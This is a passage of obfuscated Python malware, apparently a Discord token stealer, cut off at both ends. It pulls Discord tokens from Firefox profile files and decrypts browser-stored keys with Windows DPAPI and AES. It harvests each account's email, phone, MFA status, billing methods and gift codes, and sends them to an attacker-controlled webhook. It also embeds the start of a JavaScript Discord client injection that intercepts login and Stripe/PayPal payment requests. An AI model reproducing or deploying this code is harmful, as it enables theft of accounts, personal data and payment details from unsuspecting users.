                                        PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH.append(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB)
                                        OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR.append(DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX)
                                        SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU[GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB] = (TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB, f"{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\\{v4r_file_name}")

        if os.path.exists(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + "\\Mozilla\\Firefox\\Profiles"):
            for FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY, _, v4r_files in os.walk(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB in re.findall(QNQJNPEFSBYXHYGEAZVNRUAWCIVPLQEODBYSIUCIAVKLQZSPHQOBQRUANPDQLOCFLKOBICJJKSNBRNYYQVCMS, v4r_line.strip()):
                                    if KYDKJXFDIGDIJOCKSNGTEAUXVEXQMXHYPYKTZNZEKHVEJILHBEWFOROKJOGHNLYG(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB, WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ):
                                        DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX = requests.get(WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ, headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB}).json()['id']
                                        if DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX not in OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR:
                                            PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH.append(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB)
                                            OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR.append(DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX)
                                            SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU[GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB] = ('Firefox', f"{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\\{v4r__file}")
        return PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH, SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU

    def KYDKJXFDIGDIJOCKSNGTEAUXVEXQMXHYPYKTZNZEKHVEJILHBEWFOROKJOGHNLYG(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB, WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ):
        return requests.get(WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ, headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB}).status_code == 200

    def KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBYVal(LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM):
        AIJZLCNXVCBSTLRDDCKETBTHIWIXHLWZLZAJOVJINLZWDHJLDPATJTTDSSQCXZPYMYVSMRNBORUGMAILNZHVSXNDAJ = LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH[3:15]
        ZHLMTYNXTLBQMVMKNFMCYFSVYOEUSGVRMRGVBOZJVHKKJVZWXPTNVKCEGJTPGCHWTUAEZAIL = LKOPMAQXXPZHALWFROBBIIYVSQQGLAWQZDWYIPGJOPXWFWFLPJQAMDABZODJCRLLNQIVH[15:]
        BQQGOGEVKROCDNEXNFWEFQHQEIVQKDMTOVUSDKZKJDCMXSBCYXK = AES.new(MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM, AES.MODE_GCM, AIJZLCNXVCBSTLRDDCKETBTHIWIXHLWZLZAJOVJINLZWDHJLDPATJTTDSSQCXZPYMYVSMRNBORUGMAILNZHVSXNDAJ)
        return BQQGOGEVKROCDNEXNFWEFQHQEIVQKDMTOVUSDKZKJDCMXSBCYXK.decrypt(ZHLMTYNXTLBQMVMKNFMCYFSVYOEUSGVRMRGVBOZJVHKKJVZWXPTNVKCEGJTPGCHWTUAEZAIL)[:-16].decode()

    def KRGGXTMYYEWIVYSQFRMUZLWXZTWNIWZOJBABDVMGGQDKKHGXNOT(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
        if not os.path.exists(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
            return None
        with open(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY, "r", encoding="utf-8") as v4r_f:
            RSPROCEDDCOTFLDWYZVWVSUCKPXNBYOECEQHEKEUPVQCFBEKDCKTRHDCAHQMLSCSUXNKYIPKWXWKBQDSNCTBFDYAVJCC = json.load(v4r_f)
        MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM = base64.b64decode(RSPROCEDDCOTFLDWYZVWVSUCKPXNBYOECEQHEKEUPVQCFBEKDCKTRHDCAHQMLSCSUXNKYIPKWXWKBQDSNCTBFDYAVJCC["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM, None, None, None, 0)[1]

    PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH, SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU = TYYXTZQLHTPEHPTPGDSSJHCKEXRWQPDXMGKEJXINYSWTLWAMUJT()
    BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU = SyncWebhook.from_url(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)

    if not PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH:
        TWYCHAEIQDBWJMQHOYQYFUZCEBUZHCCOIZISGVNCSECAUXVOIXCWCCPZJQYNV(
            AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, 
            title=f'Discord Token {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:', 
            description=f"No discord tokens found."
        )
        return
    
    for GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB_d15c0rd in PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH:
        NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB_d15c0rd}).json()

        HTVWUCIHALSYJSDHVDUIMOAHIRUUYCWGHLCBIRSSRFGZGINCTHUHUGSJWYPYUXGMDBJFYQPMFZHZGGKLHMJJRUBSKBGEJZVH = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('username', "None") + '#' + NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('discriminator', "None")
        IQBNTUGZZXSWGHFZJOCRAYFIKNIXRTYAZMNKYIKJGJMTCYTJHAI = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('global_name', "None")
        YEULAKRXGENSECHPNHDWJAQOHVFVOADMTHJCTAJBDAITBRSXWVUNBJEHJSENOCSDPANAIFXBLZTZIMQIHQHAXNHYT = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('id', "None")
        XUMPHLVQEPSGXFPYRHFPJUCSQSNTWBVJVDEMSKMOPOZKQCRBKFBQJ = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('email', "None")
        SPWKAIHUJMGFTXVGPKISVBXONLMFBJSQKSHNAYEIZEWCRDZYEJZVL = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('verified', "None")
        QFHXUBNMOCHSCINBFLETNBFREEYBRDEHQHICKJMMVGSQTZCGUVHQLARYNQJWLYJGLXGHUFHXMACXDEYBKT = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('phone', "None")
        AJILEEUPCQCAFRZOZAJGUUJYEIERSBKROOIDGXNURUUMZXSEGVMFLSYMITXAGXPBLOBHXGPZSOLOODCENZV = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('locale', "None")
        GLYVVIREUOMGJMZZQPSVFBUXPDTOHCKDFLXEEWEGPYCSIGSSLXLMJBFOJDHPSBQXMJOOROEEKOHBHJIAZDHQ = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('mfa_enabled', "None")

        try:
            if NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('premium_type', 'None') == 0:
                SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK = 'False'
            elif NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('premium_type', 'None') == 1:
                SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK = 'Nitro Classic'
            elif NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('premium_type', 'None') == 2:
                SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK = 'Nitro Boosts'
            elif NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('premium_type', 'None') == 3:
                SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK = 'Nitro Basic'
            else:
                SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK = 'False'
        except:
            SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK = "None"

        try: 
            ISDIKEBVNAMAJCOHMTYBVNFIHDTBAZWNWAHEDKPCBPLIKYJKWSNJVBHDDUSXPSEPJNIEPPIZXFVFW = f"https://cdn.discordapp.com/avatars/{YEULAKRXGENSECHPNHDWJAQOHVFVOADMTHJCTAJBDAITBRSXWVUNBJEHJSENOCSDPANAIFXBLZTZIMQIHQHAXNHYT}/{NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{YEULAKRXGENSECHPNHDWJAQOHVFVOADMTHJCTAJBDAITBRSXWVUNBJEHJSENOCSDPANAIFXBLZTZIMQIHQHAXNHYT}/{NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{YEULAKRXGENSECHPNHDWJAQOHVFVOADMTHJCTAJBDAITBRSXWVUNBJEHJSENOCSDPANAIFXBLZTZIMQIHQHAXNHYT}/{NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG['avatar']}.png"
        except: 
            ISDIKEBVNAMAJCOHMTYBVNFIHDTBAZWNWAHEDKPCBPLIKYJKWSNJVBHDDUSXPSEPJNIEPPIZXFVFW = KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM

        try:
            MNRINZEXBCLOOXVNSXBFNUEPOAKFTJDIGONXITOQCVHHGXGKSAILIQWBWCCQVQPNLLMRQMGXNVUQLAOLTEPR = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB_d15c0rd}).json()
            if MNRINZEXBCLOOXVNSXBFNUEPOAKFTJDIGONXITOQCVHHGXGKSAILIQWBWCCQVQPNLLMRQMGXNVUQLAOLTEPR:
                CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB = []

                for v4r_method in MNRINZEXBCLOOXVNSXBFNUEPOAKFTJDIGONXITOQCVHHGXGKSAILIQWBWCCQVQPNLLMRQMGXNVUQLAOLTEPR:
                    if v4r_method['type'] == 1:
                        CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB.append('CB')
                    elif v4r_method['type'] == 2:
                        CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB.append("Paypal")
                    else:
                        CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB.append('Other')
                CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB = ' / '.join(CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB)
            else:
                CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB = "None"
        except:
            CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB = "None"

        try:
            SOMONWQGTUMOQKFDQQCUWEERMYZESZVJUHXCMMMKSAMBZELTLA = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB_d15c0rd}).json()
            if SOMONWQGTUMOQKFDQQCUWEERMYZESZVJUHXCMMMKSAMBZELTLA:
                OUXWRQVXFDRKDIGUNLJSGGKPXQKISFBNPHIUGIZIKMDSIVCDKTPYGQVPJPQIQFTODCFJ = []
                for PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ in SOMONWQGTUMOQKFDQQCUWEERMYZESZVJUHXCMMMKSAMBZELTLA:
                    TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB = PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ['promotion']['outbound_title']
                    PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ = PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ['code']
                    KVHKLTGRXAYKZAZSGHNSXSUFJAWIFSZXFDSRBDEKGEJMCJCREHJXREVKOCZQRQKSKRO = f"Gift: {TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB}\nCode: {PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ}"
                    if len('\n\n'.join(PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ)) + len(KVHKLTGRXAYKZAZSGHNSXSUFJAWIFSZXFDSRBDEKGEJMCJCREHJXREVKOCZQRQKSKRO) >= 1024:
                        break
                    OUXWRQVXFDRKDIGUNLJSGGKPXQKISFBNPHIUGIZIKMDSIVCDKTPYGQVPJPQIQFTODCFJ.append(KVHKLTGRXAYKZAZSGHNSXSUFJAWIFSZXFDSRBDEKGEJMCJCREHJXREVKOCZQRQKSKRO)
                if len(OUXWRQVXFDRKDIGUNLJSGGKPXQKISFBNPHIUGIZIKMDSIVCDKTPYGQVPJPQIQFTODCFJ) > 0:
                    PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ = '\n\n'.join(OUXWRQVXFDRKDIGUNLJSGGKPXQKISFBNPHIUGIZIKMDSIVCDKTPYGQVPJPQIQFTODCFJ)
                else:
                    PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ = "None"
            else:
                PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ = "None"
        except:
            PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ = "None"
    
        v4r_software_name, FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY = SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU.get(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:', color=TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX)      
        embed.add_field(name=":file_folder: Path:", value=f"```{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{HTVWUCIHALSYJSDHVDUIMOAHIRUUYCWGHLCBIRSSRFGZGINCTHUHUGSJWYPYUXGMDBJFYQPMFZHZGGKLHMJJRUBSKBGEJZVH}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{IQBNTUGZZXSWGHFZJOCRAYFIKNIXRTYAZMNKYIKJGJMTCYTJHAI}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{YEULAKRXGENSECHPNHDWJAQOHVFVOADMTHJCTAJBDAITBRSXWVUNBJEHJSENOCSDPANAIFXBLZTZIMQIHQHAXNHYT}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{XUMPHLVQEPSGXFPYRHFPJUCSQSNTWBVJVDEMSKMOPOZKQCRBKFBQJ}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{SPWKAIHUJMGFTXVGPKISVBXONLMFBJSQKSHNAYEIZEWCRDZYEJZVL}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{QFHXUBNMOCHSCINBFLETNBFREEYBRDEHQHICKJMMVGSQTZCGUVHQLARYNQJWLYJGLXGHUFHXMACXDEYBKT}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{SDABERDLVFLYHVOTIHIFOPCEDCREPFEIMSAVFDDTABIHIWBEKWPYXWNQLQFMWNUEMEJFJEKLMPOISROJOFRJYUVLK}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{AJILEEUPCQCAFRZOZAJGUUJYEIERSBKROOIDGXNURUUMZXSEGVMFLSYMITXAGXPBLOBHXGPZSOLOODCENZV}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{CLHLJBHPXXHENZUNYONPIXVJDBQWIZAXVHBRBALMQLDJUSJPUROGERLSUPAWVUFJXJDFAKKPPHB}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{PZHHSBELCXYKJETTYHYNZOYVQYNWUQAWHZIEJOQAODQTBJYHNTXGCRAUOANNSYPKFEGHIGLWONZYPMSVLWVCLBCOINMGARKFHZQ}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{GLYVVIREUOMGJMZZQPSVFBUXPDTOHCKDFLXEEWEGPYCSIGSSLXLMJBFOJDHPSBQXMJOOROEEKOHBHJIAZDHQ}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=ISDIKEBVNAMAJCOHMTYBVNFIHDTBAZWNWAHEDKPCBPLIKYJKWSNJVBHDDUSXPSEPJNIEPPIZXFVFW)
        embed.set_footer(text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
        BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU.send(embed=embed, username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE, avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)

OSJAKCSSWZXWSTBDFCWBIYDXZNKFMFGODGREFKECCBUEKDEBXMDKQRQXKURN = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
